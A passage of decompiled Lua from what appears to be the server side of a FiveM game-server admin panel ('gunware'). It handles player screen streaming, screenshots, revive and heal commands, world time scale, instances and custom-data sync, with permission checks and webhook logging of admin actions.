    if L1_2 == L6_2 then
      L6_2 = TriggerClientEvent
      L7_2 = "gunware:stream:signal"
      L8_2 = L5_2.adminSrc
      L9_2 = {}
      L9_2.sessionId = L2_2
      L9_2.signalType = L3_2
      L9_2.data = L4_2
      L9_2.from = "broadcaster"
      L6_2(L7_2, L8_2, L9_2)
    else
      L6_2 = L7_1
      L7_2 = "refused signal for session %s from %d"
      L8_2 = L7_2
      L7_2 = L7_2.format
      L9_2 = L2_2
      L10_2 = L1_2
      L7_2, L8_2, L9_2, L10_2 = L7_2(L8_2, L9_2, L10_2)
      L6_2(L7_2, L8_2, L9_2, L10_2)
    end
  end
end
L63_1(L64_1, L65_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:stream:stop"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:stream:stop"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L1_2 = source
  L2_2 = type
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if "table" ~= L2_2 then
    return
  end
  L2_2 = A0_2.sessionId
  if not L2_2 or "" == L2_2 then
    return
  end
  L3_2 = L9_1
  L4_2 = L2_2
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    return
  end
  L4_2 = L3_2.adminSrc
  if L1_2 ~= L4_2 then
    L4_2 = L3_2.targetSrc
    if L1_2 ~= L4_2 then
      L4_2 = L7_1
      L5_2 = "refused stop for session %s from %d"
      L6_2 = L5_2
      L5_2 = L5_2.format
      L7_2 = L2_2
      L8_2 = L1_2
      L5_2, L6_2, L7_2, L8_2 = L5_2(L6_2, L7_2, L8_2)
      L4_2(L5_2, L6_2, L7_2, L8_2)
      return
    end
  end
  L4_2 = L3_2.adminSrc
  if L1_2 == L4_2 then
    L4_2 = "viewer"
    if L4_2 then
      goto lbl_41
    end
  end
  L4_2 = "broadcaster"
  ::lbl_41::
  L5_2 = L10_1
  L6_2 = L2_2
  L7_2 = A0_2.reason
  if not L7_2 then
    L7_2 = "manual_stop"
  end
  L8_2 = L4_2
  L5_2(L6_2, L7_2, L8_2)
end
L63_1(L64_1, L65_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:stream:status"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:stream:status"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L1_2 = source
  L2_2 = type
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if "table" ~= L2_2 then
    return
  end
  L2_2 = A0_2.sessionId
  L3_2 = A0_2.status
  if not L2_2 or "" == L2_2 then
    return
  end
  L4_2 = L9_1
  L5_2 = L2_2
  L4_2 = L4_2(L5_2)
  if not L4_2 then
    return
  end
  if "error" == L3_2 then
    L5_2 = L4_2.adminSrc
    if L1_2 ~= L5_2 then
      L5_2 = L4_2.targetSrc
      if L1_2 ~= L5_2 then
        goto lbl_41
      end
    end
    L5_2 = L4_2.adminSrc
    if L1_2 == L5_2 then
      L5_2 = "viewer"
      if L5_2 then
        goto lbl_36
      end
    end
    L5_2 = "broadcaster"
    ::lbl_36::
    L6_2 = L10_1
    L7_2 = L2_2
    L8_2 = "client_error"
    L9_2 = L5_2
    L6_2(L7_2, L8_2, L9_2)
  end
  ::lbl_41::
end
L63_1(L64_1, L65_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:upload:screenshot"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:upload:screenshot"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L2_2 = source
  if not A0_2 or not A1_2 then
    return
  end
  L3_2 = GetPlayerName
  L4_2 = L2_2
  L3_2 = L3_2(L4_2)
  L4_2 = GetPlayerName
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  if not L3_2 or not L4_2 then
    return
  end
  L5_2 = TriggerClientEvent
  L6_2 = "gunware:upload:screenshot:show"
  L7_2 = A0_2
  L8_2 = A1_2
  L5_2(L6_2, L7_2, L8_2)
  L5_2 = TriggerClientEvent
  L6_2 = "gunware:notif"
  L7_2 = A0_2
  L8_2 = "success"
  L9_2 = "Screenshot pris avec succ\195\168s !"
  L5_2(L6_2, L7_2, L8_2, L9_2)
  L5_2 = logAdminAction
  L6_2 = {}
  L6_2.action = "Screenshot Upload"
  L6_2.playerName = L4_2
  L6_2.targetName = L3_2
  L6_2.source = A0_2
  L6_2.targetPlayerId = L2_2
  L7_2 = string
  L7_2 = L7_2.format
  L8_2 = "Screenshot upload\195\169 avec succ\195\168s pour %s"
  L9_2 = L3_2
  L7_2 = L7_2(L8_2, L9_2)
  L6_2.description = L7_2
  L6_2.webhook = "screenshot_upload"
  L6_2.item = A1_2
  L6_2.color = 65280
  L5_2(L6_2)
end
L63_1(L64_1, L65_1)
function L63_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L2_2 = A0_2.identifier
  L3_2 = L34_1.Async
  L3_2 = L3_2.fetchAll
  L4_2 = "SELECT skin FROM users WHERE identifier = @identifier"
  L5_2 = {}
  L5_2["@identifier"] = L2_2
  function L6_2(A0_3)
    local L1_3, L2_3, L3_3, L4_3
    if A0_3 then
      L1_3 = #A0_3
      if L1_3 > 0 then
        L1_3 = A0_3[1]
        L1_3 = L1_3.skin
        if L1_3 then
          L2_3 = A1_2
          L3_3 = json
          L3_3 = L3_3.decode
          L4_3 = L1_3
          L3_3, L4_3 = L3_3(L4_3)
          L2_3(L3_3, L4_3)
        else
          L2_3 = A1_2
          L3_3 = {}
          L2_3(L3_3)
        end
    end
    else
      L1_3 = A1_2
      L2_3 = {}
      L1_3(L2_3)
    end
  end
  L3_2(L4_2, L5_2, L6_2)
end
GetPlayerSkin = L63_1
L63_1 = L60_1
L64_1 = "gunware:revive"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L2_2 = L31_1
  if L2_2 then
    L2_2 = L31_1.revive
    if L2_2 then
      L2_2 = L31_1.revive
      L3_2 = A1_2
      L2_2(L3_2)
      L2_2 = logAdminAction
      L3_2 = {}
      L3_2.action = "Revive"
      L4_2 = GetPlayerName
      L5_2 = A0_2
      L4_2 = L4_2(L5_2)
      L3_2.playerName = L4_2
      L4_2 = GetPlayerName
      L5_2 = A1_2
      L4_2 = L4_2(L5_2)
      L3_2.targetName = L4_2
      L3_2.source = A0_2
      L3_2.targetPlayerId = A1_2
      L4_2 = string
      L4_2 = L4_2.format
      L5_2 = "R\195\169animation de %s par %s"
      L6_2 = GetPlayerName
      L7_2 = A1_2
      L6_2 = L6_2(L7_2)
      L7_2 = GetPlayerName
      L8_2 = A0_2
      L7_2, L8_2 = L7_2(L8_2)
      L4_2 = L4_2(L5_2, L6_2, L7_2, L8_2)
      L3_2.description = L4_2
      L3_2.webhook = "revive"
      L3_2.color = 65280
      L2_2(L3_2)
  end
  else
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "error"
    L6_2 = "Revive functionality not available."
    L2_2(L3_2, L4_2, L5_2, L6_2)
    L2_2 = logAdminAction
    L3_2 = {}
    L3_2.action = "Revive - Fonction non disponible"
    L4_2 = GetPlayerName
    L5_2 = A0_2
    L4_2 = L4_2(L5_2)
    L3_2.playerName = L4_2
    L3_2.source = A0_2
    L3_2.description = "Tentative de revive mais la fonction n'est pas disponible"
    L3_2.webhook = "error_framework"
    L3_2.color = 16711680
    L2_2(L3_2)
  end
end
L66_1 = "player_revive"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:reviveAll"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L1_2 = 0
  L2_2 = pairs
  L3_2 = GetPlayers
  L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2 = L3_2()
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = L31_1
    if L8_2 then
      L8_2 = L31_1.revive
      if L8_2 then
        L8_2 = L31_1.revive
        L9_2 = L7_2
        L8_2(L9_2)
        L1_2 = L1_2 + 1
    end
    else
      L8_2 = TriggerClientEvent
      L9_2 = "gunware:notif"
      L10_2 = A0_2
      L11_2 = "error"
      L12_2 = "Revive functionality not available for all players."
      L8_2(L9_2, L10_2, L11_2, L12_2)
      break
    end
  end
  if L1_2 > 0 then
    L2_2 = logAdminAction
    L3_2 = {}
    L3_2.action = "Revive All"
    L4_2 = GetPlayerName
    L5_2 = A0_2
    L4_2 = L4_2(L5_2)
    L3_2.playerName = L4_2
    L3_2.source = A0_2
    L4_2 = string
    L4_2 = L4_2.format
    L5_2 = "R\195\169animation de %d joueurs"
    L6_2 = L1_2
    L4_2 = L4_2(L5_2, L6_2)
    L3_2.description = L4_2
    L3_2.webhook = "revive_all"
    L3_2.amount = L1_2
    L3_2.color = 65280
    L2_2(L3_2)
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "success"
    L6_2 = "Revived %d players."
    L7_2 = L6_2
    L6_2 = L6_2.format
    L8_2 = L1_2
    L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2 = L6_2(L7_2, L8_2)
    L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2)
  else
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "info"
    L6_2 = "No players were revived or functionality is unavailable."
    L2_2(L3_2, L4_2, L5_2, L6_2)
    L2_2 = logAdminAction
    L3_2 = {}
    L3_2.action = "Revive All - Aucun joueur"
    L4_2 = GetPlayerName
    L5_2 = A0_2
    L4_2 = L4_2(L5_2)
    L3_2.playerName = L4_2
    L3_2.source = A0_2
    L3_2.description = "Tentative de revive all mais aucun joueur n'a \195\169t\195\169 r\195\169anim\195\169"
    L3_2.webhook = "warning_action"
    L3_2.color = 16776960
    L2_2(L3_2)
  end
end
L66_1 = "player_revive"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:heal"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L2_2 = L31_1
  if L2_2 then
    L2_2 = L31_1.heal
    if L2_2 then
      L2_2 = L31_1.heal
      L3_2 = A1_2
      L2_2(L3_2)
      L2_2 = logAdminAction
      L3_2 = {}
      L3_2.action = "Heal"
      L4_2 = GetPlayerName
      L5_2 = A0_2
      L4_2 = L4_2(L5_2)
      L3_2.playerName = L4_2
      L4_2 = GetPlayerName
      L5_2 = A1_2
      L4_2 = L4_2(L5_2)
      L3_2.targetName = L4_2
      L3_2.source = A0_2
      L3_2.targetPlayerId = A1_2
      L4_2 = string
      L4_2 = L4_2.format
      L5_2 = "Soin de %s par %s"
      L6_2 = GetPlayerName
      L7_2 = A1_2
      L6_2 = L6_2(L7_2)
      L7_2 = GetPlayerName
      L8_2 = A0_2
      L7_2, L8_2 = L7_2(L8_2)
      L4_2 = L4_2(L5_2, L6_2, L7_2, L8_2)
      L3_2.description = L4_2
      L3_2.webhook = "heal"
      L3_2.color = 65280
      L2_2(L3_2)
  end
  else
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "error"
    L6_2 = "Heal functionality not available."
    L2_2(L3_2, L4_2, L5_2, L6_2)
    L2_2 = logAdminAction
    L3_2 = {}
    L3_2.action = "Heal - Fonction non disponible"
    L4_2 = GetPlayerName
    L5_2 = A0_2
    L4_2 = L4_2(L5_2)
    L3_2.playerName = L4_2
    L3_2.source = A0_2
    L3_2.description = "Tentative de heal mais la fonction n'est pas disponible"
    L3_2.webhook = "error_framework"
    L3_2.color = 16711680
    L2_2(L3_2)
  end
end
L66_1 = "player_heal"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:healAll"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L1_2 = 0
  L2_2 = pairs
  L3_2 = GetPlayers
  L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2 = L3_2()
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = L31_1
    if L8_2 then
      L8_2 = L31_1.heal
      if L8_2 then
        L8_2 = L31_1.heal
        L9_2 = L7_2
        L8_2(L9_2)
        L1_2 = L1_2 + 1
    end
    else
      L8_2 = TriggerClientEvent
      L9_2 = "gunware:notif"
      L10_2 = A0_2
      L11_2 = "error"
      L12_2 = "Heal functionality not available for all players."
      L8_2(L9_2, L10_2, L11_2, L12_2)
      break
    end
  end
  if L1_2 > 0 then
    L2_2 = logAdminAction
    L3_2 = {}
    L3_2.action = "Heal All"
    L4_2 = GetPlayerName
    L5_2 = A0_2
    L4_2 = L4_2(L5_2)
    L3_2.playerName = L4_2
    L3_2.source = A0_2
    L4_2 = string
    L4_2 = L4_2.format
    L5_2 = "Soin de %d joueurs"
    L6_2 = L1_2
    L4_2 = L4_2(L5_2, L6_2)
    L3_2.description = L4_2
    L3_2.webhook = "heal_all"
    L3_2.amount = L1_2
    L3_2.color = 65280
    L2_2(L3_2)
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "success"
    L6_2 = "Healed %d players."
    L7_2 = L6_2
    L6_2 = L6_2.format
    L8_2 = L1_2
    L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2 = L6_2(L7_2, L8_2)
    L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2)
  else
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "info"
    L6_2 = "No players were healed or functionality is unavailable."
    L2_2(L3_2, L4_2, L5_2, L6_2)
    L2_2 = logAdminAction
    L3_2 = {}
    L3_2.action = "Heal All - Aucun joueur"
    L4_2 = GetPlayerName
    L5_2 = A0_2
    L4_2 = L4_2(L5_2)
    L3_2.playerName = L4_2
    L3_2.source = A0_2
    L3_2.description = "Tentative de heal all mais aucun joueur n'a \195\169t\195\169 soign\195\169"
    L3_2.webhook = "warning_action"
    L3_2.color = 16776960
    L2_2(L3_2)
  end
end
L66_1 = "player_heal"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:setTimeScale"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  L2_2 = "Temps normal (x1)"
  L3_2 = 1.0
  L4_2 = type
  L5_2 = A1_2
  L4_2 = L4_2(L5_2)
  if "table" == L4_2 then
    L4_2 = tonumber
    L5_2 = A1_2.scale
    if not L5_2 then
      L5_2 = A1_2.value
    end
    L4_2 = L4_2(L5_2)
    L3_2 = L4_2 or L3_2
    if not L4_2 then
      L3_2 = 1.0
    end
    L4_2 = A1_2.label
    if L4_2 then
      L4_2 = tostring
      L5_2 = A1_2.label
      L4_2 = L4_2(L5_2)
      L2_2 = L4_2
    end
  elseif nil ~= A1_2 then
    L4_2 = tonumber
    L5_2 = A1_2
    L4_2 = L4_2(L5_2)
    L3_2 = L4_2 or L3_2
    if not L4_2 then
      L3_2 = 1.0
    end
  end
  L4_2 = math
  L4_2 = L4_2.max
  L5_2 = 0.05
  L6_2 = math
  L6_2 = L6_2.min
  L7_2 = L3_2
  L8_2 = 1.0
  L6_2, L7_2, L8_2, L9_2, L10_2, L11_2 = L6_2(L7_2, L8_2)
  L4_2 = L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2)
  L3_2 = L4_2
  L43_1 = L3_2
  L4_2 = TriggerClientEvent
  L5_2 = "gunware:client:setTimeScale"
  L6_2 = -1
  L7_2 = L43_1
  L4_2(L5_2, L6_2, L7_2)
  L4_2 = string
  L4_2 = L4_2.format
  L5_2 = "Temps r\195\169gl\195\169 sur %s (%.2f)"
  L6_2 = L2_2
  L7_2 = L43_1
  L4_2 = L4_2(L5_2, L6_2, L7_2)
  L5_2 = logAdminAction
  L6_2 = {}
  L6_2.action = "Time Scale"
  L7_2 = GetPlayerName
  L8_2 = A0_2
  L7_2 = L7_2(L8_2)
  L6_2.playerName = L7_2
  L6_2.source = A0_2
  L6_2.description = L4_2
  L6_2.webhook = "time_scale"
  L7_2 = L43_1
  L6_2.amount = L7_2
  L7_2 = L43_1
  if 1.0 == L7_2 then
    L7_2 = 65280
    if L7_2 then
      goto lbl_75
    end
  end
  L7_2 = 3447003
  ::lbl_75::
  L6_2.color = L7_2
  L7_2 = {}
  L8_2 = {}
  L8_2.name = "\240\159\142\154\239\184\143 Valeur"
  L9_2 = string
  L9_2 = L9_2.format
  L10_2 = "%.2f"
  L11_2 = L43_1
  L9_2 = L9_2(L10_2, L11_2)
  L8_2.value = L9_2
  L8_2.inline = true
  L9_2 = {}
  L9_2.name = "\240\159\147\157 Pr\195\169r\195\169glage"
  L9_2.value = L2_2
  L9_2.inline = true
  L7_2[1] = L8_2
  L7_2[2] = L9_2
  L6_2.fields = L7_2
  L5_2(L6_2)
  L5_2 = TriggerClientEvent
  L6_2 = "gunware:notif"
  L7_2 = A0_2
  L8_2 = "success"
  L9_2 = "Temps r\195\169gl\195\169 sur %s"
  L10_2 = L9_2
  L9_2 = L9_2.format
  L11_2 = L2_2
  L9_2, L10_2, L11_2 = L9_2(L10_2, L11_2)
  L5_2(L6_2, L7_2, L8_2, L9_2, L10_2, L11_2)
end
function L66_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = L29_1
  L2_2 = A0_2
  L3_2 = "world_time_scale"
  return L1_2(L2_2, L3_2)
end
L63_1(L64_1, L65_1, L66_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:requestTimeScale"
function L65_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2
  L0_2 = source
  L1_2 = TriggerClientEvent
  L2_2 = "gunware:client:setTimeScale"
  L3_2 = L0_2
  L4_2 = L43_1
  L1_2(L2_2, L3_2, L4_2)
end
L63_1(L64_1, L65_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:sync:connectPlayer"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:sync:connectPlayer"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L2_2 = source
  L3_2 = L29_1
  L4_2 = L2_2
  L5_2 = "personal_reconnect"
  L3_2 = L3_2(L4_2, L5_2)
  if not L3_2 then
    L3_2 = TriggerClientEvent
    L4_2 = "gunware:notif"
    L5_2 = L2_2
    L6_2 = "error"
    L7_2 = "Vous n'avez pas la permission pour cette action."
    L3_2(L4_2, L5_2, L6_2, L7_2)
    return
  end
  if A1_2 then
    L3_2 = TriggerEvent
    L4_2 = "gunware:acc"
    L5_2 = L2_2
    L6_2 = A1_2
    L7_2 = false
    L3_2(L4_2, L5_2, L6_2, L7_2)
  end
  L3_2 = TriggerEvent
  L4_2 = "gunware:acc"
  L5_2 = L2_2
  L6_2 = A0_2
  L7_2 = false
  L3_2(L4_2, L5_2, L6_2, L7_2)
  L3_2 = Citizen
  L3_2 = L3_2.Wait
  L4_2 = 1000
  L3_2(L4_2)
  L3_2 = TriggerEvent
  L4_2 = "gunware:acc"
  L5_2 = L2_2
  L6_2 = A0_2
  L7_2 = true
  L3_2(L4_2, L5_2, L6_2, L7_2)
  L3_2 = TriggerClientEvent
  L4_2 = "setlastaccountidentifier"
  L5_2 = L2_2
  L6_2 = A0_2
  L3_2(L4_2, L5_2, L6_2)
end
L63_1(L64_1, L65_1)
L63_1 = L60_1
L64_1 = "gunware:resetInstance"
function L65_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = SetPlayerRoutingBucket
  L2_2 = A0_2
  L3_2 = 0
  L1_2(L2_2, L3_2)
  L1_2 = TriggerClientEvent
  L2_2 = "gunware:notif"
  L3_2 = A0_2
  L4_2 = "info"
  L5_2 = "You have been teleported to the main instance."
  L1_2(L2_2, L3_2, L4_2, L5_2)
  L1_2 = logAdminAction
  L2_2 = {}
  L2_2.action = "Reset Instance"
  L3_2 = GetPlayerName
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  L2_2.playerName = L3_2
  L2_2.description = "Reset player instance to main"
  L2_2.webhook = "instance_reset"
  L1_2(L2_2)
end
L66_1 = "player_resetInstance"
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:enterInstance"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L2_2 = GetPlayerPed
  L3_2 = A1_2
  L2_2 = L2_2(L3_2)
  if L2_2 then
    L2_2 = GetPlayerRoutingBucket
    L3_2 = A1_2
    L2_2 = L2_2(L3_2)
    L3_2 = SetPlayerRoutingBucket
    L4_2 = A0_2
    L5_2 = L2_2
    L3_2(L4_2, L5_2)
    L3_2 = TriggerClientEvent
    L4_2 = "gunware:notif"
    L5_2 = A0_2
    L6_2 = "info"
    L7_2 = "You have been teleported to %s's instance."
    L8_2 = L7_2
    L7_2 = L7_2.format
    L9_2 = GetPlayerName
    L10_2 = A1_2
    L9_2, L10_2 = L9_2(L10_2)
    L7_2, L8_2, L9_2, L10_2 = L7_2(L8_2, L9_2, L10_2)
    L3_2(L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
    L3_2 = logAdminAction
    L4_2 = {}
    L4_2.action = "Enter Player Instance"
    L5_2 = GetPlayerName
    L6_2 = A0_2
    L5_2 = L5_2(L6_2)
    L4_2.playerName = L5_2
    L5_2 = "Entered "
    L6_2 = GetPlayerName
    L7_2 = A1_2
    L6_2 = L6_2(L7_2)
    L7_2 = "'s instance"
    L5_2 = L5_2 .. L6_2 .. L7_2
    L4_2.description = L5_2
    L4_2.webhook = "instance_enter"
    L3_2(L4_2)
  else
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "error"
    L6_2 = "Target player is not online."
    L2_2(L3_2, L4_2, L5_2, L6_2)
  end
end
L66_1 = "player_enterInstance"
L63_1(L64_1, L65_1, L66_1)
L63_1 = RegisterNetEvent
L64_1 = "gunware:sync:data"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:sync:data"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L2_2 = source
  L3_2 = type
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  if "table" ~= L3_2 then
    return
  end
  L3_2 = A1_2.permissionKey
  if L3_2 then
    L3_2 = A1_2.permissionKey
    if "" ~= L3_2 then
      L3_2 = L29_1
      L4_2 = L2_2
      L5_2 = A1_2.permissionKey
      L3_2 = L3_2(L4_2, L5_2)
      if not L3_2 then
        L3_2 = TriggerClientEvent
        L4_2 = "gunware:notif"
        L5_2 = L2_2
        L6_2 = "error"
        L7_2 = "Vous n'avez pas la permission pour cette action."
        L3_2(L4_2, L5_2, L6_2, L7_2)
        return
      end
  end
  else
    L3_2 = IsStaff
    L4_2 = L2_2
    L3_2 = L3_2(L4_2)
    if not L3_2 then
      return
    end
  end
  L3_2 = A1_2.uuid
  if not L3_2 then
    L3_2 = GetHashKey
    L4_2 = string
    L4_2 = L4_2.format
    L5_2 = "%s-%d-%d"
    L6_2 = os
    L6_2 = L6_2.date
    L7_2 = "%Y%m%d%H%M%S"
    L6_2 = L6_2(L7_2)
    L7_2 = L2_2
    L8_2 = math
    L8_2 = L8_2.random
    L9_2 = 1000
    L10_2 = 9999
    L8_2, L9_2, L10_2 = L8_2(L9_2, L10_2)
    L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2 = L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
    L3_2 = L3_2(L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
    A1_2.uuid = L3_2
  end
  A1_2.type = A0_2
  L3_2 = custom_data
  L4_2 = A1_2.uuid
  L3_2 = L3_2[L4_2]
  if L3_2 then
    L3_2 = custom_data
    L4_2 = A1_2.uuid
    L3_2 = L3_2[L4_2]
    L4_2 = pairs
    L5_2 = A1_2
    L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
    for L8_2, L9_2 in L4_2, L5_2, L6_2, L7_2 do
      if "type" ~= L8_2 then
        L3_2[L8_2] = L9_2
      end
    end
    L4_2 = saveCustomDataEntry
    L5_2 = A1_2.uuid
    L6_2 = custom_data
    L7_2 = A1_2.uuid
    L6_2 = L6_2[L7_2]
    L4_2(L5_2, L6_2)
  end
  L3_2 = TriggerClientEvent
  L4_2 = "gunware:sync:data"
  L5_2 = -1
  L6_2 = A0_2
  L7_2 = A1_2
  L3_2(L4_2, L5_2, L6_2, L7_2)
end
L63_1(L64_1, L65_1)
L63_1 = L60_1
L64_1 = "gunware:save:data"
function L65_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2
  L3_2 = GetHashKey
  L4_2 = os
  L4_2 = L4_2.date
  L5_2 = "%Y%m%d%H%M%S"
  L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
  L3_2 = L3_2(L4_2, L5_2, L6_2, L7_2)
  A2_2.uuid = L3_2
  A2_2.type = A1_2
  L3_2 = custom_data
  L4_2 = A2_2.uuid
  L3_2[L4_2] = A2_2
  L3_2 = saveCustomDataEntry
  L4_2 = A2_2.uuid
  L5_2 = A2_2
  L3_2(L4_2, L5_2)
  L3_2 = TriggerClientEvent
  L4_2 = "gunware:sync:data"
  L5_2 = -1
  L6_2 = A1_2
  L7_2 = A2_2
  L3_2(L4_2, L5_2, L6_2, L7_2)
  L3_2 = TriggerClientEvent
  L4_2 = "gunware:notif"
  L5_2 = A0_2
  L6_2 = "success"
  L7_2 = "Data saved successfully."
  L3_2(L4_2, L5_2, L6_2, L7_2)
  L3_2 = logAdminAction
  L4_2 = {}
  L4_2.action = "Save Custom Data"
  L5_2 = GetPlayerName
  L6_2 = A0_2
  L5_2 = L5_2(L6_2)
  L4_2.playerName = L5_2
  L5_2 = "Saved custom data of type: "
  L6_2 = A1_2
  L5_2 = L5_2 .. L6_2
  L4_2.description = L5_2
  L4_2.webhook = "custom_data_save"
  L3_2(L4_2)
end
function L66_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2
  L3_2 = type
  L4_2 = A2_2
  L3_2 = L3_2(L4_2)
  if "table" == L3_2 then
    L3_2 = A2_2.permissionKey
    if L3_2 then
      goto lbl_10
    end
  end
  L3_2 = nil
  ::lbl_10::
  if L3_2 and "" ~= L3_2 then
    L4_2 = L29_1
    L5_2 = A0_2
    L6_2 = L3_2
    return L4_2(L5_2, L6_2)
  end
  L4_2 = L29_1
  L5_2 = A0_2
  L6_2 = "gestion_dev"
  return L4_2(L5_2, L6_2)
end
L63_1(L64_1, L65_1, L66_1)
L63_1 = L60_1
L64_1 = "gunware:sync:remove"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  if A1_2 then
    L2_2 = type
    L3_2 = A1_2
    L2_2 = L2_2(L3_2)
    if "number" == L2_2 then
      goto lbl_15
    end
  end
  L2_2 = TriggerClientEvent
  L3_2 = "gunware:notif"
  L4_2 = A0_2
  L5_2 = "error"
  L6_2 = "Invalid or missing UUID."
  L2_2(L3_2, L4_2, L5_2, L6_2)
  do return end
  ::lbl_15::
  L2_2 = custom_data
  L2_2 = L2_2[A1_2]
  if L2_2 then
    L2_2 = custom_data
    L2_2 = L2_2[A1_2]
    L2_2 = L2_2.type
    if not L2_2 then
      L2_2 = "unknown"
    end
    L3_2 = custom_data
    L3_2[A1_2] = nil
    L3_2 = deleteCustomDataEntry
    L4_2 = A1_2
    L3_2(L4_2)
    L3_2 = TriggerClientEvent
    L4_2 = "gunware:sync:remove"
    L5_2 = -1
    L6_2 = A1_2
    L3_2(L4_2, L5_2, L6_2)
    L3_2 = TriggerClientEvent
    L4_2 = "gunware:notif"
    L5_2 = A0_2
    L6_2 = "success"
    L7_2 = "Data removed successfully."
    L3_2(L4_2, L5_2, L6_2, L7_2)
    L3_2 = logAdminAction
    L4_2 = {}
    L4_2.action = "Remove Custom Data"
    L5_2 = GetPlayerName
    L6_2 = A0_2
    L5_2 = L5_2(L6_2)
    L4_2.playerName = L5_2
    L5_2 = "Removed custom data of type: "
    L6_2 = L2_2
    L7_2 = " (UUID: "
    L8_2 = A1_2
    L9_2 = ")"
    L5_2 = L5_2 .. L6_2 .. L7_2 .. L8_2 .. L9_2
    L4_2.description = L5_2
    L4_2.webhook = "custom_data_remove"
    L3_2(L4_2)
  else
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "error"
    L6_2 = "Data with this UUID not found."
    L2_2(L3_2, L4_2, L5_2, L6_2)
  end
end
function L66_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2
  if A2_2 and "" ~= A2_2 then
    L3_2 = L29_1
